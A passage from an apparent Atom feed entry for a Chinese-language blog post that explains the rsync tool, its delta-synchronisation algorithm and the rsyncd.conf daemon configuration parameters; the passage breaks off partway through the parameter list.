    <link href="https://jiemin.wang/2019/03/29/rsync/"/>
    <id>https://jiemin.wang/2019/03/29/rsync/</id>
    <published>2019-03-29T04:53:22.000Z</published>
    <updated>2019-03-29T05:18:58.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4EC0;&#x4E48;&#x662F;-Rsync"><a href="#&#x4EC0;&#x4E48;&#x662F;-Rsync" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F; Rsync"></a>&#x4EC0;&#x4E48;&#x662F; Rsync</h2><p>Rsync&#xFF08;remote synchronize&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; LAN/WAN &#x5FEB;&#x901F;&#x540C;&#x6B65;&#x591A;&#x53F0;&#x4E3B;&#x673A;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x3002;Rsync &#x4F7F;&#x7528;&#x6240;&#x8C13;&#x7684; &#x201C;Rsync &#x7B97;&#x6CD5;&#x201D; &#x6765;&#x4F7F;&#x672C;&#x5730;&#x548C;&#x8FDC; &#x7A0B;&#x4E24;&#x4E2A;&#x4E3B;&#x673A;&#x4E4B;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x8FBE;&#x5230;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x53EA;&#x4F20;&#x9001;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4E0D;&#x540C;&#x90E8;&#x5206;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x6574;&#x4EFD;&#x4F20;&#x9001;&#xFF0C;&#x56E0;&#x6B64;&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#x3002;</p><p>Rsync &#x672C;&#x6765;&#x662F;&#x7528;&#x4E8E;&#x66FF;&#x4EE3; rcp &#x7684;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x76EE;&#x524D;&#x7531; <a href="https://rsync.samba.org/" target="_blank" rel="noopener">samba</a> &#x7EF4;&#x62A4;&#xFF0C;&#x6240;&#x4EE5; rsync.conf &#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#x7C7B;&#x4F3C;&#x4E8E; Samba &#x7684; &#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;Rsync &#x53EF;&#x4EE5;&#x901A;&#x8FC7; rsh &#x6216; ssh &#x4F7F;&#x7528;&#xFF0C;&#x4E5F;&#x80FD;&#x4EE5; daemon &#x6A21;&#x5F0F;&#x53BB;&#x8FD0;&#x884C;&#xFF0C;&#x5728;&#x4EE5; daemon &#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#x65F6; Rsync server &#x4F1A;&#x6253;&#x5F00;&#x4E00;&#x4E2A; 873 &#x7AEF;&#x53E3;&#xFF0C;&#x7B49;&#x5F85;&#x5BA2;&#x6237;&#x7AEF;&#x53BB;&#x8FDE;&#x63A5;&#x3002;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;Rsync server &#x4F1A;&#x68C0;&#x67E5;&#x53E3;&#x4EE4;&#x662F;&#x5426;&#x76F8;&#x7B26;&#xFF0C;&#x82E5;&#x901A;&#x8FC7;&#x53E3;&#x4EE4;&#x67E5;&#x6838;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x5F00;&#x59CB;&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x3002;&#x7B2C;&#x4E00;&#x6B21;&#x8FDE;&#x901A;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;&#x4F1A;&#x628A;&#x6574;&#x4EFD;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x4E00;&#x6B21;&#xFF0C;&#x4EE5;&#x540E;&#x5219;&#x5C31;&#x53EA;&#x9700;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x3002;</p><p>Rsync &#x652F;&#x6301;&#x5927;&#x591A;&#x6570;&#x7684;&#x7C7B; Unix &#x7CFB;&#x7EDF;&#xFF0C;&#x65E0;&#x8BBA;&#x662F; Linux&#x3001;Solaris &#x8FD8;&#x662F; BSD &#x4E0A;&#x90FD;&#x7ECF;&#x8FC7;&#x4E86;&#x826F;&#x597D;&#x7684;&#x6D4B;&#x8BD5;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5B83;&#x5728; windows &#x5E73;&#x53F0;&#x4E0B;&#x4E5F;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5982; cwRsync &#x548C; Sync2NAS &#x7B49;&#x5DE5;&#x5177;&#x3002;</p><p>Rsync &#x7684;&#x57FA;&#x672C;&#x7279;&#x70B9;&#x5982;&#x4E0B;&#xFF1A;</p><ol><li>&#x53EF;&#x4EE5;&#x955C;&#x50CF;&#x4FDD;&#x5B58;&#x6574;&#x4E2A;&#x76EE;&#x5F55;&#x6811;&#x548C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF1B;</li><li>&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x505A;&#x5230;&#x4FDD;&#x6301;&#x539F;&#x6765;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x3001;&#x65F6;&#x95F4;&#x3001;&#x8F6F;&#x786C;&#x94FE;&#x63A5;&#x7B49;&#xFF1B;</li><li>&#x65E0;&#x987B;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x5373;&#x53EF;&#x5B89;&#x88C5;&#xFF1B;</li><li>&#x4F18;&#x5316;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x6548;&#x7387;&#x9AD8;&#xFF1B;</li><li>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; rsh&#x3001;ssh &#x7B49;&#x65B9;&#x5F0F;&#x6765;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x7684; socket &#x8FDE;&#x63A5;&#xFF1B;</li><li>&#x652F;&#x6301;&#x533F;&#x540D;&#x4F20;&#x8F93;&#x3002;</li></ol><h2 id="Rsync-&#x540C;&#x6B65;&#x7B97;&#x6CD5;"><a href="#Rsync-&#x540C;&#x6B65;&#x7B97;&#x6CD5;" class="headerlink" title="Rsync &#x540C;&#x6B65;&#x7B97;&#x6CD5;"></a>Rsync &#x540C;&#x6B65;&#x7B97;&#x6CD5;</h2><p>Rsync &#x53EA;&#x6240;&#x4EE5;&#x540C;&#x6B65;&#x6587;&#x4EF6;&#x7684;&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#xFF0C;&#x662F;&#x56E0;&#x4E3A; &#x201C;Rsync &#x540C;&#x6B65;&#x7B97;&#x6CD5;&#x201D; &#x80FD;&#x5728;&#x5F88;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x8BA1;&#x7B97;&#x51FA;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5173;&#x4E8E; Rsync &#x7684;&#x540C;&#x6B65;&#x7B97;&#x6CD5;&#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><p>&#x5047;&#x5B9A;&#x5728; 1 &#x53F7;&#x548C; 2 &#x53F7;&#x4E24;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x4E4B;&#x95F4;&#x540C;&#x6B65;&#x76F8;&#x4F3C;&#x7684;&#x6587;&#x4EF6; A &#x4E0E; B&#xFF0C;&#x5176;&#x4E2D; 1 &#x53F7;&#x5BF9;&#x6587;&#x4EF6; A &#x62E5;&#x6709;&#x8BBF;&#x95EE;&#x6743;&#xFF0C;2 &#x53F7;&#x5BF9;&#x6587;&#x4EF6; B &#x62E5;&#x6709;&#x8BBF;&#x95EE;&#x6743;&#x3002;&#x5E76;&#x4E14;&#x5047;&#x5B9A;&#x4E3B;&#x673A; 1 &#x53F7;&#x4E0E; 2 &#x53F7;&#x4E4B;&#x95F4;&#x7684;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;&#x5F88;&#x5C0F;&#x3002;&#x90A3;&#x4E48; rsync &#x7B97;&#x6CD5;&#x5C06;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x4E94;&#x4E2A;&#x6B65;&#x9AA4;&#x6765;&#x5B8C;&#x6210;&#xFF1A;</p><ol><li>2 &#x53F7;&#x5C06;&#x6587;&#x4EF6; B &#x5206;&#x5272;&#x6210;&#x4E00;&#x7EC4;&#x4E0D;&#x91CD;&#x53E0;&#x7684;&#x56FA;&#x5B9A;&#x5927;&#x5C0F;&#x4E3A; S &#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x5757;&#x53EF;&#x80FD;&#x4F1A;&#x6BD4; S &#x5C0F;&#x3002;</li><li>2 &#x53F7;&#x5BF9;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x5272;&#x597D;&#x7684;&#x6570;&#x636E;&#x5757;&#x6267;&#x884C;&#x4E24;&#x79CD;&#x6821;&#x9A8C;&#xFF1A;&#x4E00;&#x79CD;&#x662F; 32 &#x4F4D;&#x7684;&#x6EDA;&#x52A8;&#x5F31;&#x6821;&#x9A8C;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F; 128 &#x4F4D;&#x7684; MD4 &#x5F3A;&#x6821;&#x9A8C;</li><li>2 &#x53F7;&#x5C06;&#x8FD9;&#x4E9B;&#x6821;&#x9A8C;&#x7ED3;&#x679C;&#x53D1;&#x7ED9; 1 &#x53F7;&#x3002;</li><li>1 &#x53F7;&#x901A;&#x8FC7;&#x641C;&#x7D22;&#x6587;&#x4EF6; A &#x7684;&#x6240;&#x6709;&#x5927;&#x5C0F;&#x4E3A; S &#x7684;&#x6570;&#x636E;&#x5757; (&#x504F;&#x79FB;&#x91CF;&#x53EF;&#x4EE5;&#x4EFB;&#x9009;&#xFF0C;&#x4E0D;&#x4E00;&#x5B9A;&#x975E;&#x8981;&#x662F; S &#x7684;&#x500D;&#x6570;)&#xFF0C;&#x6765;&#x5BFB;&#x627E;&#x4E0E;&#x6587;&#x4EF6; B &#x7684;&#x67D0;&#x4E00;&#x5757;&#x6709;&#x7740;&#x76F8;&#x540C;&#x7684;&#x5F31;&#x6821;&#x9A8C;&#x7801;&#x548C;&#x5F3A;&#x6821;&#x9A8C;&#x7801;&#x7684;&#x6570;&#x636E;&#x5757;&#x3002;&#x8FD9;&#x9879;&#x5DE5;&#x4F5C;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x6EDA;&#x52A8;&#x6821;&#x9A8C;&#x7684;&#x7279;&#x6027;&#x5F88;&#x5FEB;&#x5B8C;&#x6210;&#x3002;</li><li>1 &#x53F7;&#x53D1;&#x7ED9; 2 &#x53F7;&#x4E00;&#x4E32;&#x6307;&#x4EE4;&#x6765;&#x751F;&#x6210;&#x6587;&#x4EF6; A &#x5728; 2 &#x53F7;&#x4E0A;&#x7684;&#x5907;&#x4EFD;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x6BCF;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x8981;&#x4E48;&#x662F;&#x5BF9;&#x6587;&#x4EF6; B &#x7ECF;&#x62E5;&#x6709;&#x67D0;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5757;&#x800C;&#x4E0D;&#x987B;&#x91CD;&#x4F20;&#x7684;&#x8BC1;&#x660E;&#xFF0C;&#x8981;&#x4E48;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5757;&#x80AF;&#x5B9A;&#x662F;&#x6CA1;&#x6709;&#x4E0E;&#x6587;&#x4EF6; B &#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5757;&#x5339;&#x914D;&#x4E0A;&#x7684;&#x3002;</li></ol><h2 id="Rsync-&#x53C2;&#x6570;&#x8BF4;&#x660E;"><a href="#Rsync-&#x53C2;&#x6570;&#x8BF4;&#x660E;" class="headerlink" title="Rsync &#x53C2;&#x6570;&#x8BF4;&#x660E;"></a>Rsync &#x53C2;&#x6570;&#x8BF4;&#x660E;</h2><p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;<code>rsyncd.conf</code></p><h4 id="&#x5168;&#x5C40;&#x53C2;&#x6570;"><a href="#&#x5168;&#x5C40;&#x53C2;&#x6570;" class="headerlink" title="&#x5168;&#x5C40;&#x53C2;&#x6570;"></a>&#x5168;&#x5C40;&#x53C2;&#x6570;</h4><p>&#x5728;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;<code>[module]</code>&#x4E4B;&#x524D;&#x7684;&#x6240;&#x6709;&#x53C2;&#x6570;&#x90FD;&#x662F;&#x5168;&#x5C40;&#x53C2;&#x6570;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x5168;&#x5C40;&#x53C2;&#x6570;&#x90E8;&#x5206;&#x5B9A;&#x4E49;&#x6A21;&#x5757;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x8BE5;&#x53C2;&#x6570;&#x7684;&#x503C;&#x5C31;&#x662F;&#x6240;&#x6709;&#x6A21;&#x5757;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x3002;</p><p><code>port</code>&#x6307;&#x5B9A;&#x540E;&#x53F0;&#x7A0B;&#x5E8F;&#x4F7F;&#x7528;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; <code>873</code>&#x3002;</p><p><code>motd file</code>&#x7528;&#x6765;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#x6587;&#x4EF6;&#xFF0C;&#x5F53;&#x5BA2;&#x6237;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x663E;&#x793A;&#x7ED9;&#x5BA2;&#x6237;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;&#x6CA1;&#x6709; <code>motd</code> &#x6587;&#x4EF6;&#x7684;&#x3002;</p><p><code>log file</code>&#x6307;&#x5B9A; <code>rsync</code> &#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x5C06;&#x65E5;&#x5FD7;&#x53D1;&#x9001;&#x7ED9; <code>syslog</code>&#x3002;&#x6BD4;&#x5982;&#x53EF;&#x6307;&#x5B9A;&#x4E3A; <code>/var/log/rsyncd.log</code>&#x3002;</p><p><code>pid file</code>&#x6307;&#x5B9A; <code>rsync</code> &#x7684; <code>pid</code> &#x6587;&#x4EF6;&#xFF0C;&#x901A;&#x5E38;&#x6307;&#x5B9A;&#x4E3A; <code>/var/run/rsyncd.pid</code>&#x3002;</p><p><code>syslog facility</code>&#x6307;&#x5B9A; <code>rsync</code> &#x53D1;&#x9001;&#x65E5;&#x5FD7;&#x6D88;&#x606F;&#x7ED9; <code>syslog</code> &#x65F6;&#x7684;&#x6D88;&#x606F;&#x7EA7;&#x522B;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x6D88;&#x606F;&#x7EA7;&#x522B;&#x662F;&#xFF1A;</p><ul><li>daemon &#x9ED8;&#x8BA4;&#x503C;</li><li>uth</li><li>authpriv</li><li>cron</li><li>daemon</li><li>ftp</li><li>kern</li><li>lpr</li><li>mail</li><li>news</li><li>security</li><li>sys-log</li><li>user</li><li>uucp</li><li>local0</li><li>local1</li><li>local2</li><li>local3</li><li>local4</li><li>local5</li><li>local6</li><li>local7</li></ul><h4 id="&#x6A21;&#x5757;&#x53C2;&#x6570;"><a href="#&#x6A21;&#x5757;&#x53C2;&#x6570;" class="headerlink" title="&#x6A21;&#x5757;&#x53C2;&#x6570;"></a>&#x6A21;&#x5757;&#x53C2;&#x6570;</h4><p>&#x4E3B;&#x8981;&#x662F;&#x5B9A;&#x4E49;&#x670D;&#x52A1;&#x5668;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x8981;&#x88AB;&#x540C;&#x6B65;&#x3002;&#x5176;&#x683C;&#x5F0F;&#x5FC5;&#x987B;&#x4E3A;<code>&#x201C;[module]&#x201D;</code>&#x5F62;&#x5F0F;&#xFF0C;&#x8FD9;&#x4E2A;&#x540D;&#x5B57;&#x5C31;&#x662F;&#x5728; <code>rsync</code> &#x5BA2;&#x6237;&#x7AEF;&#x770B;&#x5230;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x5176;&#x5B9E;&#x6709;&#x70B9;&#x8C61; <code>Samba</code> &#x670D;&#x52A1;&#x5668;&#x63D0;&#x4F9B;&#x7684;&#x5171;&#x4EAB;&#x540D;&#x3002;&#x800C;&#x670D;&#x52A1;&#x5668;&#x771F;&#x6B63;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x662F;&#x901A;&#x8FC7; <code>path</code> &#x6765;&#x6307;&#x5B9A;&#x7684;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x9700;&#x8981;&#xFF0C;&#x6765;&#x6307;&#x5B9A;&#x591A;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x6A21;&#x5757;&#x4E2D;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF1A;</p><p><code>comment</code>&#x7ED9;&#x6A21;&#x5757;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x63CF;&#x8FF0;&#xFF0C;&#x8BE5;&#x63CF;&#x8FF0;&#x8FDE;&#x540C;&#x6A21;&#x5757;&#x540D;&#x5728;&#x5BA2;&#x6237;&#x8FDE;&#x63A5;&#x5F97;&#x5230;&#x6A21;&#x5757;&#x5217;&#x8868;&#x65F6;&#x663E;&#x793A;&#x7ED9;&#x5BA2;&#x6237;&#x3002;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x63CF;&#x8FF0;&#x5B9A;&#x4E49;&#x3002;</p><p><code>path</code>&#x6307;&#x5B9A;&#x8BE5;&#x6A21;&#x5757;&#x7684;&#x4F9B;&#x5907;&#x4EFD;&#x7684;&#x76EE;&#x5F55;&#x6811;&#x8DEF;&#x5F84;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x662F;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x7684;&#x3002;</p><p><code>use chroot</code>&#x5982;&#x679C;&#x6307;&#x5B9A;&#x4E3A; <code>true</code>&#xFF0C;&#x90A3;&#x4E48; <code>rsync</code> &#x5728;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x4EE5;&#x524D;&#x9996;&#x5148; <code>chroot</code> &#x5230; <code>path</code> &#x53C2;&#x6570;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x4E0B;&#x3002;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x539F;&#x56E0;&#x662F;&#x5B9E;&#x73B0;&#x989D;&#x5916;&#x7684;&#x5B89;&#x5168;&#x9632;&#x62A4;&#xFF0C;&#x4F46;&#x662F;&#x7F3A;&#x70B9;&#x662F;&#x9700;&#x8981;&#x4EE5; <code>root</code> &#x6743;&#x9650;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x80FD;&#x5907;&#x4EFD;&#x6307;&#x5411;&#x5916;&#x90E8;&#x7684;&#x7B26;&#x53F7;&#x8FDE;&#x63A5;&#x6240;&#x6307;&#x5411;&#x7684;&#x76EE;&#x5F55;&#x6587;&#x4EF6;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; <code>true</code>&#x3002;</p><p><code>uid</code>&#x6307;&#x5B9A;&#x5F53;&#x8BE5;&#x6A21;&#x5757;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x65F6;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x5E94;&#x8BE5;&#x5177;&#x6709;&#x7684; <code>uid</code>&#xFF0C;&#x914D;&#x5408; <code>gid</code>&#x9009;&#x9879;&#x4F7F;&#x7528;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x54EA;&#x4E9B;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x600E;&#x4E48;&#x6837;&#x7684;&#x6587;&#x4EF6;&#x6743;&#x9650;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x662F;<code>&#x201D;nobody&#x201D;</code>&#x3002;</p><p><code>gid</code>&#x6307;&#x5B9A;&#x5F53;&#x8BE5;&#x6A21;&#x5757;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x65F6;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x5E94;&#x8BE5;&#x5177;&#x6709;&#x7684; <code>gid</code>&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;<code>&#x201D;nobody&#x201D;</code>&#x3002;</p><p><code>max connections</code>&#x6307;&#x5B9A;&#x8BE5;&#x6A21;&#x5757;&#x7684;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x8FDE;&#x63A5;&#x6570;&#x91CF;&#x4EE5;&#x4FDD;&#x62A4;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8D85;&#x8FC7;&#x9650;&#x5236;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5C06;&#x88AB;&#x544A;&#x77E5;&#x968F;&#x540E;&#x518D;&#x8BD5;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x662F; <code>0</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x3002;</p><p><code>list</code>&#x8BE5;&#x9009;&#x9879;&#x8BBE;&#x5B9A;&#x5F53;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x6A21;&#x5757;&#x5217;&#x8868;&#x65F6;&#xFF0C;&#x8BE5;&#x6A21;&#x5757;&#x662F;&#x5426;&#x5E94;&#x8BE5;&#x88AB;&#x5217;&#x51FA;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x8BE5;&#x9009;&#x9879;&#x4E3A; <code>false</code>&#xFF0C;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x9690;&#x85CF;&#x7684;&#x6A21;&#x5757;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x662F; <code>true</code>&#x3002;</p><p><code>read only</code>&#x8BBE;&#x5B9A;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x5BA2;&#x6237;&#x4E0A;&#x8F7D;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x4E3A; <code>true</code> &#x90A3;&#x4E48;&#x4EFB;&#x4F55;&#x4E0A;&#x8F7D;&#x8BF7;&#x6C42;&#x90FD;&#x4F1A;&#x5931;&#x8D25;&#xFF0C;&#x5982;&#x679C;&#x4E3A; <code>false</code> &#x5E76;&#x4E14;&#x670D;&#x52A1;&#x5668;&#x76EE;&#x5F55;&#x8BFB;&#x5199;&#x6743;&#x9650;&#x5141;&#x8BB8;&#x90A3;&#x4E48;&#x4E0A;&#x8F7D;&#x662F;&#x5141;&#x8BB8;&#x7684;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; <code>true</code>&#x3002;</p><p><code>exclude</code>&#x7528;&#x6765;&#x6307;&#x5B9A;&#x591A;&#x4E2A;&#x7531;&#x7A7A;&#x683C;&#x9694;&#x5F00;&#x7684;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55; (&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;)&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x6DFB;&#x52A0;&#x5230; <code>exclude</code> &#x5217;&#x8868;&#x4E2D;&#x3002;&#x8FD9;&#x7B49;&#x540C;&#x4E8E;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x547D;&#x4EE4;&#x4E2D;&#x4F7F;&#x7528;<code>--exclude</code>&#x6765;&#x6307;&#x5B9A; &#x6A21;&#x5F0F;&#xFF0C;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#x53EA;&#x80FD;&#x6307;&#x5B9A;&#x4E00;&#x4E2A; <code>exclude</code> &#x9009;&#x9879;&#x3002;&#x4F46;&#x662F;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x4E00;&#x70B9;&#x662F;&#x8BE5;&#x9009;&#x9879;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5B89;&#x5168;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x5BA2;&#x6237;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x7ED5;&#x8FC7; <code>exclude</code> &#x5217;&#x8868;&#xFF0C;&#x5982;&#x679C;&#x5E0C;&#x671B;&#x786E;&#x4FDD;&#x7279;&#x5B9A; &#x7684;&#x6587;&#x4EF6;&#x4E0D;&#x80FD;&#x88AB;&#x8BBF;&#x95EE;&#xFF0C;&#x90A3;&#x5C31;&#x6700;&#x597D;&#x7ED3;&#x5408; <code>uid/gid</code> &#x9009;&#x9879;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#x3002;</p><p><code>exclude from</code>&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5305;&#x542B; <code>exclude</code> &#x6A21;&#x5F0F;&#x7684;&#x5B9A;&#x4E49;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6; <code>exclude</code> &#x5217;&#x8868;&#x5B9A;&#x4E49;&#x3002;</p><p><code>include</code>&#x7528;&#x6765;&#x6307;&#x5B9A;&#x4E0D;&#x6392;&#x9664;&#x7B26;&#x5408;&#x8981;&#x6C42;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x3002;&#x8FD9;&#x7B49;&#x540C;&#x4E8E;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x547D;&#x4EE4;&#x4E2D;&#x4F7F;&#x7528;<code>&#x2013;include</code> &#x6765;&#x6307;&#x5B9A;&#x6A21;&#x5F0F;&#xFF0C;&#x7ED3;&#x5408; <code>include</code> &#x548C; <code>exclude</code> &#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x590D;&#x6742;&#x7684; <code>exclude/include</code> &#x89C4;&#x5219;&#x3002;</p><p><code>include from</code>&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5305;&#x542B; <code>include</code> &#x6A21;&#x5F0F;&#x7684;&#x5B9A;&#x4E49;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6; <code>include</code> &#x5217;&#x8868;&#x5B9A;&#x4E49;&#x3002;</p><p><code>auth users</code>&#x6307;&#x5B9A;&#x7531;&#x7A7A;&#x683C;&#x6216;&#x9017;&#x53F7;&#x5206;&#x9694;&#x7684;&#x7528;&#x6237;&#x540D;&#x5217;&#x8868;&#xFF0C;&#x53EA;&#x6709;&#x8FD9;&#x4E9B;&#x7528;&#x6237;&#x624D;&#x5141;&#x8BB8;&#x8FDE;&#x63A5;&#x8BE5;&#x6A21;&#x5757;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x7528;&#x6237;&#x548C;&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5173;&#x7CFB;&#x3002;&#x5982;&#x679C;&#x201D;auth users&#x201D; &#x88AB;&#x8BBE;&#x7F6E;&#xFF0C;&#x90A3;&#x4E48;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA;&#x5BF9;&#x8BE5;&#x6A21;&#x5757;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x4EE5;&#x540E;&#x4F1A;&#x88AB; <code>rsync</code> &#x8BF7;&#x6C42; <code>challenged</code> &#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#x8EAB;&#x4EFD;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x7684; <code>challenge/response</code> &#x8BA4;&#x8BC1;&#x534F;&#x8BAE;&#x3002;&#x7528;&#x6237;&#x7684;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x4EE5;&#x660E;&#x6587;&#x65B9;&#x5F0F;&#x5B58;&#x653E;&#x5728;<code>&#x201D;secrets file&#x201D;</code> &#x9009;&#x9879;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x65E0;&#x9700;&#x5BC6;&#x7801;&#x5C31;&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;&#x6A21;&#x5757; (&#x4E5F;&#x5C31;&#x662F;&#x533F;&#x540D;&#x65B9;&#x5F0F;)&#x3002;</p><p><code>secrets 